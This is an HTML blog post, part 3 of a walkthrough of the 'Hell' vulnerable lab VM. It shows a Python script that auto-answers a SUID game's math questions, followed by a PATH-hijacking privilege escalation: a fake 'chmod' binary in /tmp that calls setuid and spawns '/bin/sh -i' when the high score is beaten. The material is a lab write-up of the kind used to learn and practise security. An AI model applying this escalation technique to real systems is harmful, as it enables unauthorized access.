@@ -1,0 +1,325 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Hell Walkthrough - Part 3 - FourFourFourFour</title>
+  <meta name="author" content="recrudesce">
+
+  
+  <meta name="description" content="Tweet Hell Walkthrough - Part 3 Jul 19th, 2014 8:05 pm vm's Part 1 | Part 2 | Part 3 | Part 4 | Part 5 I Want to Play a Game, But No Jigsaws, OK ?! &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://recrudesce.github.io/blog/2014/07/19/hell-walkthrough-part-3/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="FourFourFourFour" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body >
+  <header role="banner" id="sidebar">
+    <!-- Logo -->
+<aside id="logo" class="clearfix">
+  <div class="clearfix">
+    <a href="/">FourFourFourFour</a>
+  </div>
+</aside>
+
+<ul id="menu">
+
+  <li class="title">
+    <h1 id="title"><a href="/">FourFourFourFour</a></h1>
+  </li>
+
+
+  <li class="subtitle">
+    <h2 id="subtitle">A Feeble Attempt At A Blog.</h2>
+  </li>
+
+  <li class="link">
+    <a href="/about/">about</a>
+  </li>
+
+  <li class="link">
+    <a href="http://twitter.com/recrudesce/">twitter</a>
+  </li>
+
+
+  <li class="link rss">
+    <a href="/atom.xml">rss feed</a>
+  </li>
+</ul>
+
+
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:recrudesce.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+
+
+<!-- Octopress Love -->
+<aside id="octopress_linkback">
+  <a href="http://octopress.org/">
+    <span class="unicode_square">
+      <span class="unicode_circle">
+        &nbsp;
+      </span>
+    </span>
+    <span class="octopress">Powered by Octopress</span>
+  </a>
+</aside>
+
+  </header>
+  <section id="main">
+    <article class="post">
+  <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://recrudesce.github.io/blog/2014/07/19/hell-walkthrough-part-3/" data-via="recrudesce" data-counturl="http://recrudesce.github.io/blog/2014/07/19/hell-walkthrough-part-3/" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+  
+  <header>
+    
+      <h2 class="entry-title">Hell Walkthrough - Part 3</h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-07-19T20:05:34+01:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>19</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>8:05 pm</span></time>
+		
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/vms/'>vm&#8217;s</a>
+  
+</span>
+
+
+        
+      </p>
+    
+  </header>
+
+
+<p><a href="http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/">Part 1</a> | <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/">Part 2</a> | Part 3 | <a href="http://fourfourfourfour.co/2014/07/20/hell-walkthrough-part-4/">Part 4</a> | <a href="http://fourfourfourfour.co/2014/07/21/hell-walkthrough-part-5/">Part 5</a></p>
+
+<h2>I Want to Play a Game, But No Jigsaws, OK ?!</h2>
+
+<p>The home folder for milk_4_life is pretty sparse, just a binary called &ldquo;game&rdquo;. However, it&rsquo;s owned by the george user, and has the suid attribute set.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]$ ls -l
+total 20
+&mdash;s&ndash;x&ndash;x 1 george      george      5743 Jun 19 18:24 game[/plain]</p>
+
+<p>Running the binary produces the following output, which doesn&rsquo;t tell us much other than it&rsquo;s &ldquo;listening&rdquo;. Like a overly intrusive neighbour.</p>
+
+<!-- more -->
+
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ ./game
+I&rsquo;m listening[/plain]</p>
+
+<p>Netstat isn&rsquo;t available on this VM, so we have to find another way to obtain listening port information. Thankfully ss saves the day and shows the game binary IS actually listening, on port 1337 - h4x !</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ ss -lp
+State       Recv-Q Send-Q    Local Address:Port    Peer Address:Port
+LISTEN      0      50        127.0.0.1:mysql       <em>:</em>
+LISTEN      0      128       :::sunrpc             :::<em>
+LISTEN      0      128       </em>:sunrpc              <em>:</em>
+LISTEN      0      128       :::http               :::<em>
+LISTEN      0      128       :::38035              :::</em>
+LISTEN      0      128       <em>:35380               </em>:<em>
+LISTEN      0      128       :::ssh                :::</em>
+LISTEN      0      128       <em>:ssh                 </em>:<em>
+LISTEN      0      10        </em>:1337                <em>:</em>
+LISTEN      0      20        ::1:smtp              :::<em>
+LISTEN      0      20        127.0.0.1:smtp        </em>:<em>
+LISTEN      0      10        </em>:666                 <em>:</em>[/plain]</p>
+
+<p>Connecting to the port from another session asks us to type &ldquo;START&rdquo; to begin. It&rsquo;s more fun to troll the code, though, by typing something completely different. Did you expect anything less of me ?</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ telnet 127.0.0.1 1337
+Trying 127.0.0.1&hellip;
+Connected to 127.0.0.1.
+Escape character is &lsquo;^]&rsquo;.
+Type &lsquo;START&rsquo; to begin</p>
+
+<p>banana
+No&hellip; START. S-T-A-R-T</p>
+
+<p>Connection closed by foreign host.[/plain]</p>
+
+<p>OK, enough messing around, let&rsquo;s see what this game does. Typing START presents us with a high score, and then math questions that only your high school math teacher would ask you infront of the rest of the class. Needless to say I&rsquo;m not answering any of these correctly !</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ telnet 127.0.0.1 1337
+Trying 127.0.0.1&hellip;
+Connected to 127.0.0.1.
+Escape character is &lsquo;^]&rsquo;.
+Type &lsquo;START&rsquo; to begin</p>
+
+<p>START
+Starting&hellip;</p>
+
+<p>You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)</p>
+
+<p>Quick what&rsquo;s&hellip; 924 x 541? Umm
+Quick what&rsquo;s&hellip; 982 x 21? No idea
+Quick what&rsquo;s&hellip; 194 x 542? Really ?
+Quick what&rsquo;s&hellip; 679 x 733? WHY WOULD I NEED TO KNOW THIS !?
+Quick what&rsquo;s&hellip; 960 x 248? I give up.
+Quick what&rsquo;s&hellip; 718 x 646? THANKS OBAMA !
+Quick what&rsquo;s&hellip; 162 x 784? ^C
+Connection closed by foreign host[/plain]</p>
+
+<p>Being the competitive person I am, I figured it would be fun to try and beat the score. More than 133723 points in 30 seconds means I have to answer 4457 correct answers a second. I can type quickly, but not that quickly. This requires some scripting - Python to the rescue ! This script connects to the game, reads the question, splits it based on &ldquo; x &rdquo; to get both numbers, performs the multiplication and sends the answer back. Granted I had some help on with this code - thanks c0ne !</p>
+
+<p>[python]</p>
+
+<h1>!/usr/bin/python</h1>
+
+<p>import socket
+import re</p>
+
+<p>s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect=s.connect((&lsquo;127.0.0.1&rsquo;,1337)) # hardcoded IP address
+s.recv(1024)
+s.send(&lsquo;START\n&rsquo;) # login procedure
+s.recv(110)
+while True:
+    d = s.recv(200)
+    l = re.findall(r&#8221;Quick what&rsquo;s&hellip; (.*?)\?&ldquo;, d)
+    if not l:
+        print d
+        break
+    (a,b) = l[0].split(&lsquo; x &rsquo;)
+    mul = int(a) * int(b)
+    print str(mul)
+    s.send(str(mul)+&lsquo;\n&rsquo;)</p>
+
+<p>print s.recv(1024)
+s.close()[/python]</p>
+
+<p>Running it produces a sense of authority over our robot overlords - I&rsquo;m gaming the game.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ python gamey3.py
+125451
+150858
+498300
+493353
+60564
+<strong><strong> SNIP </strong></strong>
+174386
+841312
+53636
+Final Score: 412619</p>
+
+<p>!<em>!</em>!<em>!</em>! Congratulations, new high score (412619) !<em>!</em>!<em>!</em>!</p>
+
+<p>I hear the faint sound of chmodding&hellip;&hellip;.[/plain]</p>
+
+<p><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/high_score_320x320.png" alt="high_score_320x320" /></p>
+
+<p>It seems that the binary performs an action when the highscore is beaten. I&rsquo;m not sure what it chmods, but I wonder if we can play this game at it&rsquo;s own game and make it run a bogus binary. There&rsquo;s a distinct possibility the code is relying on the PATH environment variable and just calling system(&ldquo;chmod file&rdquo;) rather than using an absolute path.</p>
+
+<p>So, a bogus chmod binary is created using the following source, compiled, placed in /tmp on the VM and made executable (do I need to show you how to do this ? No ? Good. Saves me the typing.)</p>
+
+<p>[c]#include &lt;stdio.h></p>
+
+<h1>include &lt;stdlib.h></h1>
+
+<h1>include &lt;sys/types.h></h1>
+
+<h1>include &lt;unistd.h></h1>
+
+<p>int main()
+{
+ setuid( 1000 );
+ system(&ldquo;id&rdquo;);
+ system( &ldquo;/bin/sh -i&rdquo; );
+}[/c]</p>
+
+<p>The path environment variable is modified to make /tmp the first location checked</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]$ PATH=/tmp:$PATH
+$ export | grep PATH
+export PATH=&lsquo;/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&rsquo;
+[/plain]</p>
+
+<p>So, hopefully, if all goes to plan, when we beat the score it should run our fake chmod binary and drop us to a shell. How about we give it a go ? The game is started, and the Python script is run to beat the score (I&rsquo;m not going to show you again, just scroll up if you want to see what it looks like).</p>
+
+<p>The score is beaten and we are indeed dropped to a new shell as the george user.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ ./game
+I&rsquo;m listening
+uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
+$
+[/plain]</p>
+
+<p><img src="http://31.media.tumblr.com/tumblr_lwipupOVfN1qh59n0o1_500.gif" alt="" /></p>
+
+
+
+</article>
+
+
+    <nav role="navigation" id="pagination">
+
+</nav>
+  </section>
+  
+
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+</body>
+</html>
